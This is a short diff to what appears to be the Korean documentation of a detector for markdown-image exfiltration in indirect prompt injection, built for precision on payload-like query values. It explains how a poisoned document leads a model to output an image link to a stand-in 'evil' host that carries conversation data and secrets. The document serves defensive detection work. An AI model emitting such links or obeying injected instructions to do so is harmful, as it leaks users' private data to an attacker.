@@ -3,7 +3,8 @@
 
 간접 프롬프트 인젝션의 대표 유출 수법: 오염 문서가 모델에게 `![](https://evil/log?d=<대화·비밀>)`
 같은 마크다운 이미지를 출력하게 하면, 렌더링 순간 브라우저가 evil 로 데이터를 실어 GET → 유출.
-에이전틱 RAG(풀스토리·세이프)에서 실누출 경로. (garak detectors/xss.MarkdownExfil 계열의 한국어 배포판.)
+에이전틱 RAG(풀스토리·세이프)에서 실누출 경로. 공개 markdown exfiltration 탐지 패턴을 한국어 배포
+환경에 맞게 보수적으로 조정했다.
 
 정밀 우선: 외부 http(s) URL 이 **데이터 payload 로 보이는 쿼리 값**(긴 토큰/base64/hex)을 가질 때만
 발동한다. 평범한 `![logo](https://site/logo.png)`(쿼리 없음)·정상 링크는 잡지 않는다.
